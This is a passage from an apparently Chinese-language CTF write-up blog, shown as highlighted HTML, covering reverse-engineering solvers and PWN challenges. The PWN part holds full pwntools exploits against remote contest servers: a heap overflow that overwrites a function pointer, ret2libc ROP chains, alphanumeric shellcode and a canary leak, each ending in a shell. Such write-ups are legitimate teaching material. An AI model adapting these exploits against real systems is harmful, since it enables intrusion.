class="string">"4b98921c9b772ed5971c9eca38b08c9f"</span>,<span class="string">"81773872cbbd24dd8df2b980a2b47340"</span>,</span><br><span class="line">        <span class="string">"73b131aa8e4847d27a1c20608199814e"</span>,<span class="string">"bbd7c4e20e99f0a3bf21c148fe22f21d"</span>,</span><br><span class="line">        <span class="string">"bf268d46ef91eea2634c34db64c91ef2"</span>,<span class="string">"0862deb943decbddb87dbf0eec3a06cc"</span>,</span><br><span class="line">        <span class="string">"7a59d932e8184ae963c40a759cc38fec"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cmp</span><span class="params">(cont, idx)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(cont)</span><br><span class="line">    <span class="keyword">if</span> md5.hexdigest() == res[idx]:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">alp = string.printable</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_range</span><span class="params">(idx)</span>:</span></span><br><span class="line">    fake = <span class="string">'flag&#123;this_is_a_fake_flag_ahhhhh&#125;'</span></span><br><span class="line">    i = ord(fake[idx*<span class="number">4</span>])</span><br><span class="line">    j = ord(fake[idx*<span class="number">4</span> + <span class="number">1</span>])</span><br><span class="line">    k = ord(fake[idx*<span class="number">4</span> + <span class="number">2</span>])</span><br><span class="line">    l = ord(fake[idx*<span class="number">4</span> + <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alp:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[*]'</span>+a</span><br><span class="line">        aa = ord(a)</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> alp:</span><br><span class="line">            bb = ord(b)</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> alp:</span><br><span class="line">                cc = ord(c)</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> alp:</span><br><span class="line">                    dd = ord(d)</span><br><span class="line">                    res = chr(aa ^ i)</span><br><span class="line">                    res += chr(bb ^ j)</span><br><span class="line">                    res += chr(cc ^ k)</span><br><span class="line">                    res += chr(dd ^ l)</span><br><span class="line">                    <span class="keyword">if</span> get_cmp(res, idx):</span><br><span class="line">                        ans = a+b+c+d</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'[-]'</span>+ans</span><br><span class="line">                        <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">    flag += get_range(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h2 id="666"><a href="#666" class="headerlink" title="666"></a>666</h2><p>分析是一个简单的异或，反着运算就行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'izwhroz""w"v.K".Ni'</span></span><br><span class="line"></span><br><span class="line">key = <span class="number">0x12</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(key//<span class="number">3</span>):</span><br><span class="line">	idx = i * <span class="number">3</span></span><br><span class="line">	flag += chr((ord(enc[idx]) ^ key) - <span class="number">6</span>)</span><br><span class="line">	flag += chr((ord(enc[idx+<span class="number">1</span>]) ^ key) + <span class="number">6</span>)</span><br><span class="line">	flag += chr((ord(enc[idx+<span class="number">2</span>]) ^ key) ^ <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<h2 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h2><p>ida打开发现程序加了壳，在手动脱壳的过程中发现flag跟输入是明文比较的。</p>
<p><img src="https://i.loli.net/2020/01/17/QLnewpybBz7HUhA.png" alt="re_babyxor.png" style="zoom:50%;"></p>
<p>继续运行，就能把整个flag得到</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>很基础的堆题，新建修改查看删除功能都有，主要漏洞就是修改的时候有堆溢出。</p>
<p>在新建堆的时候在堆块上写入了puts函数的地址，然后查看的时候直接调用这个地址。</p>
<p>这样通过修改这个地址为system，堆块内容改为’/bin/sh’就能getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">"g"</span>:</span><br><span class="line">	p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) != <span class="number">1</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"101.71.29.5"</span>,<span class="number">10052</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x	: p.recvuntil(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x	: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x	: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x	: p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">	ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(content)</span>:</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	ru(<span class="string">'Plz input content: '</span>)</span><br><span class="line">	sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	ru(<span class="string">'Plz input index: '</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line">	ru(<span class="string">'Plz input size: '</span>)</span><br><span class="line">	sl(str(size))</span><br><span class="line">	ru(<span class="string">'Plz input content: '</span>)</span><br><span class="line">	sd(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	ru(<span class="string">'Plz input index: '</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	ru(<span class="string">'Plz input index: '</span>)</span><br><span class="line">	sl(str(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="string">'aaa'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x17</span> + <span class="string">'b'</span></span><br><span class="line">edit(<span class="number">0</span>, len(payload), payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'aaaab'</span>)</span><br><span class="line">puts_addr = u64(rv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher.LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x18</span>,<span class="string">'\x00'</span>) + p64(sys_addr)</span><br><span class="line">edit(<span class="number">0</span>, len(payload), payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><p>有一说一，一血两分钟之内也太强了orz</p>
<p>程序有两个判断要绕过，第二个返回地址的绕过可以通过ret的gadget来绕过。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">"g"</span>:</span><br><span class="line">	p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) != <span class="number">1</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"101.71.29.5"</span>,<span class="number">10041</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">ret_addr = <span class="number">0x0804853D</span></span><br><span class="line">ret_gad = <span class="number">0x0804839e</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hello CTFer!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x20</span> + p32(<span class="number">0x66666666</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'What is your name?\n'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x14</span> + p32(ret_gad) + p32(puts_plt) + p32(ret_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher.LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base  = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">str_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'What is your name?\n'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x14</span> + p32(ret_gad) + p32(sys_addr) + p32(ret_addr) + p32(str_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="EasyShellcode"><a href="#EasyShellcode" class="headerlink" title="EasyShellcode"></a>EasyShellcode</h2><p>一开始还以为跟HackerGame一样的，然后发现要求全字母数字orz。好在找到了Veritas501师傅博客上的一个编码脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">"g"</span>:</span><br><span class="line">    p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"101.71.29.5"</span>,<span class="number">10080</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>,checksec = <span class="keyword">False</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'WTYH39Yj0TYfi9XVWAXfi94WWAYjZTYfi9TVWAZjdTYfi9BgWZjWTYfi9WU0T8A0t8B0t8F0t8G0t8H0T8LRAPZ0T8MZ0t8Q0t8R0T8S0t8U0t8V0t8W0t8X0t8YjmTYfi9wFRAPZ0T8AZRAPZ0t8DZRAPZ0t8EZ0t8GRAPZ0T8HZ0T8KRAPZ0T8LZRAPZ0T8NZ0t8P0t8R0t8SjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'say?'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="EasyStack"><a href="#EasyStack" class="headerlink" title="EasyStack"></a>EasyStack</h2><p>这个题泄露Canary的方式有点像查找，不断缩小区间就行，然后就是常规的ROP题了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">"g"</span>:</span><br><span class="line">    p = process(<span class="string">"./easystack"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p, <span class="string">'b *0x08048A25\nc'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"101.71.29.5"</span>,<span class="number">10036</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./easystack"</span>,checksec = <span class="keyword">False</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">final_value</span><span class="params">(st, ed)</span>:</span></span><br><span class="line">    value = [st*<span class="number">0x100</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">        mid = ed - i</span><br><span class="line">        <span class="keyword">if</span> mid &lt; st:</span><br><span class="line">            mid = st</span><br><span class="line">        value[<span class="number">299</span>-i] = mid*<span class="number">0x100</span></span><br><span class="line">    p.recvuntil(<span class="string">'calc'</span>)</span><br><span class="line">    p.sendline(<span class="string">'301'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">        p.recvuntil(<span class="string">'num'</span>)</span><br><span class="line">        p.sendline(str(value[i]))</span><br><span class="line">    p.recvuntil(<span class="string">'num'</span>)</span><br><span class="line">    p.sendline(<span class="string">'0'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">' is '</span>)</span><br><span class="line">    num = <span class="number">299</span> - int(p.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line">    log.info(<span class="string">'canary '</span>+hex(value[num]))</span><br><span class="line">    p.recvuntil(<span class="string">'y or n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    <span class="keyword">return</span> value[num]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(st, ed)</span>:</span></span><br><span class="line">    step = (ed - st) / <span class="number">300</span></span><br><span class="line">    step = step</span><br><span class="line">    value = [(st + step * i)*<span class="number">0x100</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>)]</span><br><span class="line">    p.recvuntil(<span class="string">'calc'</span>)</span><br><span class="line">    p.sendline(<span class="string">'301'</span>)</span><br><span class="line">    <span class="keyword">if</span> value[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        value[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">        p.recvuntil(<span class="string">'num'</span>)</span><br><span class="line">        p.sendline(str(value[i]))</span><br><span class="line">    p.recvuntil(<span class="string">'num'</span>)</span><br><span class="line">    p.sendline(<span class="string">'0'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">' is '</span>)</span><br><span class="line">    num = <span class="number">299</span> - int(p.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line">    log.info(hex(value[num]) + <span class="string">' '</span> + hex(value[num+<span class="number">1</span>]))</span><br><span class="line">    p.recvuntil(<span class="string">'y or n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    <span class="keyword">return</span> value[num], value[num + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">a1, b1 = get_value(<span class="number">0</span>, <span class="number">0x1000000</span>)</span><br><span class="line">a2, b2 = get_value(a1//<span class="number">0x100</span>, b1//<span class="number">0x100</span>)</span><br><span class="line">canary = final_value(a2//<span class="number">0x100</span>, b2//<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'canary '</span>+hex(canary))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'calc: '</span>)</span><br><span class="line"></span><br><span class="line">payload = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>)]</span><br><span class="line">payload.append(canary)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    payload.append(<span class="number">0x0804A020</span>)</span><br><span class="line"></span><br><span class="line">cout_addr = <span class="number">0x8048750</span></span><br><span class="line">cout_adds = <span class="number">0x0804A0C0</span></span><br><span class="line">tar_addr = <span class="number">0x08049FF4</span></span><br><span class="line"></span><br><span class="line">calc_addr = <span class="number">0x080488E7</span></span><br><span class="line"></span><br><span class="line">payload.append(cout_addr)</span><br><span class="line">payload.append(calc_addr)</span><br><span class="line">payload.append(cout_adds)</span><br><span class="line">payload.append(tar_addr)</span><br><span class="line">payload.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(str(len(payload)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)):</span><br><span class="line">    p.recvuntil(<span class="string">'num'</span>)</span><br><span class="line">    p.sendline(str(payload[i]))</span><br><span class="line">p.recvuntil(<span class="string">'y or n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">rc = p.recvuntil(<span class="string">'How'</span>)</span><br><span class="line"><span class="keyword">print</span> len(rc)</span><br><span class="line">__ctoul = u32(rc[<span class="number">2</span>:<span class="number">6</span>])</span><br><span class="line">log.success(<span class="string">'strtoul '</span>+hex(__ctoul))</span><br><span class="line">libc = LibcSearcher.LibcSearcher(<span class="string">'strtoul'</span>,__ctoul)</span><br><span class="line">libc_base = __ctoul - libc.dump(<span class="string">'strtoul'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">str_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">fini = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>)]</span><br><span class="line">fini.append(canary)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    fini.append(<span class="number">0x0804A020</span>)</span><br><span class="line"></span><br><span class="line">fini.append(sys_addr)</span><br><span class="line">fini.append(calc_addr)</span><br><span class="line">fini.append(str_addr)</span><br><span class="line">fini.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(str(len(fini)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(fini)):</span><br><span class="line">    p.recvuntil(<span class="string">'num'</span>)</span><br><span class="line">    p.sendline(str(fini[i]))</span><br><span class="line">p.recvuntil(<span class="string">'y or n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h2><p>这个堆题，不知道是不是出题人有疏忽，因为可以直接通过输入负数的idx，来获取libc addr和修改bss的值，这样就把bss上指针指向free_hook再修改成system就行。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">"g"</span>:</span><br><span class="line">	p = process(<span class="string">"./Box"</span>)</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) != 